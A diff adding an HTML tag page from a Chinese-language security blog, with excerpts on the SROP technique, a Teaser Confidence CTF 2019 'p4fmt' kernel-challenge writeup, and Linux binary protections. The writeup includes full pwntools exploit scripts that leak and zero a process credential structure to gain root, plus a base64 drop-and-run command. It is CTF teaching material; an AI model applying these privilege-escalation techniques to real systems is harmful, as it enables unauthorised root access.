@@ -1,0 +1,315 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: pwn - 歐欸利恩的部落格</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="歐欸利恩的部落格"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="歐欸利恩的部落格"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="歐欸利恩的部落格"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="歐欸利恩的部落格"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"歐欸利恩的部落格","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"歐欸利恩的部落格","logo":{"@type":"ImageObject","url":{"text":"歐欸利恩的部落格","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+    
+        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="歐欸利恩的部落格" height="28"><p>歐欸利恩的部落格</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首頁</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分類</a><a class="navbar-item" href="/tags">標籤</a><a class="navbar-item" href="/about">關於我</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">pwn</a></li></ul></nav></div></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-09-17T16:00:00.000Z" title="9/18/2019, 12:00:00 AM">2019-09-18</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/pwn/">pwn</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/09/18/srop/">【攻擊手法】SROP</a></h1><div class="content"><p>SROP 是 Sigreturn Oriented Programming 的縮寫</p>
+<h2 id="Signal">Signal</h2>
+<p>一支程式接到 signal 後</p>
+<ol>
+<li>kernel 會幫你把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame</li>
+<li>跳回 user mode，讓 signal handler 處理</li>
+<li>signal handler 處理完會 return 回 <code>__restore_rt</code>，這個 function 裡面就是 <code>mov rax, 0xf; syscall</code>，去呼叫 <code>sys_rt_sigreturn</code> syscall，把上下文恢復 Signal Frame</li>
+</ol>
+<h2 id="SigReturn-ROP">SigReturn ROP</h2>
+<p>在做 ROP 的時候需要設定許多暫存器的值<br>
+這時候就可以用 SROP 的技巧<br>
+自己在 stack 上擺好 Signal Frame，然後呼叫 <code>sys_rt_sigreturn</code> syscall<br>
+就可以一次設定好所有的暫存器<br>
+缺點是需要夠大的空間塞下整個 Signal Frame</p>
+<h2 id="sys-rt-sigreturn-syscall-gadget"><code>sys_rt_sigreturn</code> syscall gadget</h2>
+<p>哪裡有 <code>mov rax, 0xf; syscall</code> 的 gadget 可以用</p>
+<ol>
+<li>libc 裡面的 <code>__restore_rt</code></li>
+<li>自己用 ROP 設定好 rax, 再接 syscall gadget</li>
+</ol>
+<h2 id="pwntools-SigFrame">pwntools <code>SigFrame</code></h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">rop = <span class="built_in">bytes</span>(frame)</span><br></pre></td></tr></table></figure>
+<h2 id="CTF-題目">CTF 題目</h2>
+<p><a target="_blank" rel="noopener" href="http://pwnable.kr">pwnable.kr - unexploitable</a></p>
+<hr>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.slideshare.net/AngelBoy1/sigreturn-ori">https://www.slideshare.net/AngelBoy1/sigreturn-ori</a></li>
+<li><a target="_blank" rel="noopener" href="http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/">http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/</a></li>
+</ol>
+</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/09/18/srop/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-04-25T16:00:00.000Z" title="4/26/2019, 12:00:00 AM">2019-04-26</time></span><i class="material-icons">schedule</i><span class="level-item">11 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/04/26/p4fmt/">【CTF Writeups】Teaser Confidence CTF Quals 2019 - p4fmt</a></h1><div class="content"><blockquote>
+<p>Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You’re stuck with copy pasting base64’d (sometimes static) ELFs. But what if there was another solution? We’ve created a lightweight, simple binary format for your pwning pleasure. It’s time to prove your skills.<br>
+<code>nc p4fmt.zajebistyc.tf 30002</code></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">分數</th>
+<th style="text-align:center">解題人數</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">304</td>
+<td style="text-align:center">10</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="Writeup">Writeup</h2>
+<p>題目檔案解壓縮後有三個檔案 <code>bzImage</code>, <code>initramfs.cpio.gz</code>, <code>run.sh</code></p>
+<p><code>bzImage</code> 是壓縮過的 linux kernel<br>
+<code>initramfs.cpio.gz</code> 是臨時的檔案系統<br>
+<code>run.sh</code> 裡面用 <code>qemu-system-x86_64</code> 把 kernel 跑起來</p>
+<p>不熟悉 linux kernel debug 可以參考 <a href="/old/security/pwn/debug-kernel">Debug Kernel</a></p>
+<h3 id="First-Glance">First Glance</h3>
+<p><code>run.sh</code> 跑起來後就會跑 linux kernel 彈出一個 shell<br>
+<code>ls</code> 一下可以看到三個比較重要的檔案 <code>init</code>, <code>p4fmt.ko</code>, <code>flag</code><br>
+直接嘗試 <code>cat flag</code> 會得到 <code>Permission denied</code><br>
+因為我們拿到的使用者是 <code>pwn</code> 而 <code>flag</code> 只有 <code>root</code> 有權限讀<br>
+<code>init</code> 裡面有一行 <code>insmod /p4fmt.ko</code> 加載 <code>p4fmt.ko</code> 這個內核模塊<br>
+看來我們的目標就是利用 <code>p4fmt.ko</code> 裡面的漏洞提權拿 root 權限，就可以 <code>cat flag</code> 了</p>
+<h3 id="前置作業">前置作業</h3>
+<h4 id="解壓-initramfs-cpio-gz">解壓 <code>initramfs.cpio.gz</code></h4>
+<p>可以先用 <code>binwalk</code> 把 <code>initramfs.cpio.gz</code> 的檔案系統拉出來</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x initramfs.cpio.gz</span><br><span class="line">binwalk -e initramfs.cpio</span><br></pre></td></tr></table></figure>
+<h4 id="修改-init">修改 <code>init</code></h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack su root</span><br></pre></td></tr></table></figure>
+<p>修改 <code>init</code> 讓我們有 root 權限，這樣才看得到 <code>p4fmt.ko</code> 內核模塊載入後的位址，等等才方便下斷點<br>
+修改完重新打包 <code>initramfs.cpio.gz</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null --create --format=newc | gzip --best &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
+<h4 id="修改-run-sh">修改 <code>run.sh</code></h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp:127.0.0.1:6666</span><br></pre></td></tr></table></figure>
+<p>開了 gdb server 後，就可以用 gdb 連上去 debug 了<br>
+首先先取得 <code>p4fmt</code> 內核模塊的位址<br>
+可以用 <code>lsmod</code> 或 <code>cat /proc/modules</code> ( 必須有 root 權限 )</p>
+<figure class="highlight bash"><figcaption><span>gdb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :6666</span><br><span class="line">(gdb) add-symbol-file p4fmt.ko 0xffffffffc0288000</span><br><span class="line">(gdb) b load_p4_binary <span class="comment"># 這是 p4fmt 主要的函式等等逆向會看到</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><figcaption><span>"取得 p4fmt 位址"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lsmod</span></span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0288000 (O)</span><br><span class="line">/ <span class="comment"># cat /proc/modules</span></span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0288000 (O)</span><br></pre></td></tr></table></figure>
+<h3 id="逆向">逆向</h3>
+<p>起手式一樣 IDA 打開 ( 好像很多人改用 ghidra 了 O_O )<br>
+但是這次的反編譯有點糟，大部分還是看組語配 gdb<br>
+這個內核模塊主要的功能就是註冊一個新的執行檔格式 ( binary format )</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __init <span class="title function_">p4fmt_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    _register_binfmt(&amp;p4format, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __exit <span class="title function_">p4fmt_init</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    unregister_binfmt(&amp;p4format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>p4format</code> 是一個 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L95"><code>linux_binfmt</code></a> 的結構</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">module</span>;</span></span><br><span class="line">	<span class="type">int</span> (*load_binary)(<span class="keyword">struct</span> linux_binprm *);</span><br><span class="line">	<span class="type">int</span> (*load_shlib)(<span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*core_dump)(<span class="keyword">struct</span> coredump_params *cprm);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_coredump;	<span class="comment">/* minimal dump size */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
+<p>其中的 <code>load_binary</code> 這個指標就是指向負責建立環境把程式跑起來的函式<br>
+而在這裡就是指向 <code>load_p4_binary</code> 這個函式 ( 一般的 ELF 執行檔是 <code>load_elf_binary</code> )</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">load_p4_binary</span> <span class="params">(linux_binprm *bprm)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/include/linux/binfmts.h#L17"><code>linux_binprm</code></a> 會先讀檔案的前 128 bytes 放進 <code>bprm-&gt;buf</code><br>
+因為有這個結構有 <a target="_blank" rel="noopener" href="https://lwn.net/Articles/722293/"><code>__randomize_layout</code></a>，所以結構成員的順序是隨機的<br>
+這題的 <code>bprm-&gt;buf</code> 從 <code>0x48</code> 開始 128 bytes，可見下圖</p>
+<p align="center"><img data-src="https://i.imgur.com/XlPKVe1.png" class=" lazyload"  width="500" title="linux_binprm 格式"></p>
+<p>程式一開始會先檢查前兩個 bytes 是不是 <code>P4</code><br>
+接著檢查第三個 byte 是不是 <code>\x00</code>，不是的話會噴 <code>Unknown version</code><br>
+接著第四個 byte 可以是 <code>\x00</code> 或 <code>\x01</code>，<code>\x00</code> 的話會進簡單的路線，<code>\x01</code> 會進複雜的路線<br>
+接著四個 bytes 代表後面有幾個 mapping<br>
+接著八個 bytes 代表 mapping 的開頭在 buf 的 offset<br>
+接著八個 bytes 擺的是 entry point 的位址<br>
+其他的部分基本上跟 <code>load_elf_binary</code> 一樣</p>
+<figure class="highlight c"><figcaption><span>simple</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_mmap(bprm-&gt;file, *(QWORD *)(bprm + <span class="number">0x50</span>), <span class="number">0x1000</span>, *(QWORD *)(bprm + <span class="number">0x50</span>) &amp; <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><figcaption><span>complex</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">p4_mapping</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> load_addr;</span><br><span class="line">    <span class="type">long</span> length;</span><br><span class="line">    <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mapping_count = *(<span class="type">int</span> *)(bprm-&gt;buf + <span class="number">4</span>);</span><br><span class="line"><span class="type">long</span> mapping_offset = *(<span class="type">long</span> *)(bprm-&gt;buf + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">p4_mapping *mapping = bprm-&gt;buf + mapping_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; mapping_count; i++, mapping++) &#123;</span><br><span class="line">    <span class="type">long</span> addr = mapping-&gt;load_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>;</span><br><span class="line">    <span class="type">long</span> prot = mapping-&gt;load_addr &amp; <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n&quot;</span>, addr, mapping-&gt;length, mapping-&gt;offset, prot);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mapping-&gt;load_addr &amp; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// 這裡就是要初始化一段記憶體，類似 .bss 段</span></span><br><span class="line">        vm_mmap(<span class="number">0</span>, addr, mapping-&gt;length, prot, <span class="number">2</span>, mapping-&gt;offset);</span><br><span class="line">        printk(<span class="string">&quot;clear_user(addr=0x%llx, length=0x%llx)\n&quot;</span>, mapping-&gt;load_addr, mapping-&gt;length);</span><br><span class="line">        _clear_user(mapping-&gt;load_addr, mapping-&gt;length);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 這裡是要把檔案掛上去，類似 .text 段</span></span><br><span class="line">        vm_mmap(bprm-&gt;file, addr, mapping-&gt;length, prot, <span class="number">2</span>, mapping-&gt;offset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞">漏洞</h3>
+<p><code>mapping_count</code> 改大可以 leak <code>linux_binprm</code> 其他欄位的值<br>
+<code>_clear_user</code> 沒有檢查，可以把 kernel 上任意位址的值清空<br>
+<code>linux_binprm</code> 有一個 <code>cred</code> 的結構，裡面存的就是 <code>uid, gid</code><br>
+所以我們只要 leak 出這個 <code>cred</code> 的位址，然後用 <code>_clear_user</code> 清成 0，我們的程式就是 root 權限了 ( root 的 uid 是 0 )</p>
+<h3 id="嘗試">嘗試</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;P4&quot;</span>             <span class="comment"># magic</span></span><br><span class="line">payload += p8(<span class="number">0</span>)             <span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)             <span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">1</span>)            <span class="comment"># mapping_count</span></span><br><span class="line">payload += p64(<span class="number">0x18</span>)         <span class="comment"># mapping_offset</span></span><br><span class="line">payload += p64(<span class="number">0x400030</span>)     <span class="comment"># entry</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mapping</span></span><br><span class="line">payload += flat(</span><br><span class="line">    <span class="number">0x400000</span> | <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload += asm(shellcraft.echo(<span class="string">&quot;test\n&quot;</span>) + shellcraft.exit())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;echo <span class="subst">&#123;b64encode(payload).decode()&#125;</span> | base64 -d &gt; a ; chmod +x a ; ./a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>先寫個簡單的 p4 格式的執行檔測試一下我們的理解是不是對的</p>
+<figure class="highlight bash"><figcaption><span>command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> UDQAAQEAAAAYAAAAAAAAADAAQAAAAAAABwBAAAAAAAAAEAAAAAAAAAAAAAAAAAAASLgBAQEBAQEBAVBIuHVkcnULAQEBSDEEJGoBWGoBX2oFWkiJ5g8FajxYDwU= | <span class="built_in">base64</span> -d &gt; a ; <span class="built_in">chmod</span> +x a ; ./a</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><figcaption><span>output</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[50353.170813] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p>接下來要找 <code>cred</code> 的位址，因為 <code>pwn</code> 的 <code>uid</code> 是 1000 ( = 0x3e8 )<br>
+所以我們把使用者切換成 <code>pwn</code>，切成 <code>pwn</code> 之後要在 <code>/tmp</code> 才可以寫檔<br>
+然後把 <code>mapping_count</code> 改大一點，比如 <code>6</code>，在他印出的位址指向的值中找 <code>0x3e8</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[50800.668734] vm_mmap(load_addr=0x400000, length=0x1000, offset=0x0, prot=7)</span><br><span class="line">[50800.674080] vm_mmap(load_addr=0x10101010101b000, length=0x726475b848500101, offset=0x431480101010b75, prot=0)</span><br><span class="line">[50800.674550] clear_user(addr=0x10101010101b848, length=0x726475b848500101)</span><br><span class="line">[50800.675372] vm_mmap(load_addr=0x6a5f016a58016000, length=0x6a050fe689485a05, offset=0x50f583c, prot=4)</span><br><span class="line">[50800.675786] vm_mmap(load_addr=0x0, length=0x0, offset=0x0, prot=0)</span><br><span class="line">[50800.676003] vm_mmap(load_addr=0x0, length=0x7fffffffef99, offset=0x100000001, prot=0)</span><br><span class="line">[50800.676260] vm_mmap(load_addr=0x0, length=0xffffa1c307595b40, offset=0x0, prot=0)</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+<p>找了一找發現在第六個 <code>vm_mmap</code> 的 <code>0xffffa1c307595b40</code> 這個位址是 <code>cred</code><br>
+但是這個位址每次跑起來都不一樣，不過多跑幾次會發現，這個值會一直循環重複利用，所以只要多跑幾次就會對了</p>
+<h2 id="Final-Exploit-2">Final Exploit</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;P4&quot;</span>             <span class="comment"># magic</span></span><br><span class="line">payload += p8(<span class="number">0</span>)             <span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)             <span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">2</span>)            <span class="comment"># mapping_count</span></span><br><span class="line">payload += p64(<span class="number">0x18</span>)         <span class="comment"># mapping_offset</span></span><br><span class="line">payload += p64(<span class="number">0x400048</span>)     <span class="comment"># entry</span></span><br><span class="line"></span><br><span class="line">leak_cred = <span class="number">0xffff9855c758c0c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mapping</span></span><br><span class="line">payload += flat(</span><br><span class="line">    <span class="number">0x400000</span> | <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    (leak_cred | <span class="number">8</span>) + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload += asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>) + shellcraft.exit())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;echo <span class="subst">&#123;b64encode(payload).decode()&#125;</span> | base64 -d &gt; a ; chmod +x a ; ./a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<hr>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt">https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt</a></li>
+<li><a target="_blank" rel="noopener" href="https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html">https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/">https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/</a></li>
+</ol>
+</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/04/26/p4fmt/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2019-03-20T16:00:00.000Z" title="3/21/2019, 12:00:00 AM">2019-03-21</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/pwn/">pwn</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2019/03/21/protection/">【技術筆記】Linux 程序保護機制</a></h1><div class="content"><h2 id="RELRO-RELocation-Read-Only">RELRO (RELocation Read Only)</h2>
+<table>
+<thead>
+<tr>
+<th>RELRO</th>
+<th>說明</th>
+<th>gcc 編譯參數</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>No</td>
+<td>GOT writable, <code>link_map</code> writable</td>
+<td><code>gcc -Wl,-z,norelro code.c</code></td>
+</tr>
+<tr>
+<td>Partial</td>
+<td>GOT writable, <code>link_map</code> readonly</td>
+<td>DEFAULT</td>
+</tr>
+<tr>
+<td>Full</td>
+<td>GOT read only, no <code>link_map</code> and <code>dl_resolver</code> pointer</td>
+<td><code>gcc -Wl,-z,relro,-z,now code.c</code></td>
+</tr>
+</tbody>
+</table>
